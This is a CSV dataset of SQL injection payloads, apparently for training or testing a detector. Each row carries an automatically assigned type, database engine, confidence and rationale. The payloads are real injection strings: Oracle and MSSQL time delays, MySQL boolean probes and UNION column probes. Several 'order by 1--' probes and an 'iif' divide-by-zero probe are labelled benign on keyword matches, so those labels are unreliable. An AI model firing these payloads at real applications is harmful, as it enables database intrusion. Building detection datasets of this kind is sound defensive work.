id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24078,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24100,"1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24006,1 ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 16 chars.,2
24015,"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2
24021,"iif ( 9229 = 4158,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24024,1' ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
24084,1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24089,"1"" where 7371 = 7371 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24095,"1 ) where 9687 = 9687 and elt ( 9607 = 9432,9432 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
24098,"1"" ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24140,-7387' ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 25 chars.,2
24150,"-2204'|| ( select 'bwae' from dual where 4884 = 4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
24155,1' ) ) waitfor delay '0:0:5' and ( ( 'jcfe' = 'jcfe,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24168,"-9698 ) as pvhn where 3223 = 3223 or elt ( 6563 = 9210,9210 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
24179,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
24184,-4325 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
24197,"waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24001,"-4025"" or 3038 = 3038",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
24013,"-1451%' ) union all select 7666,7666,7666#",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
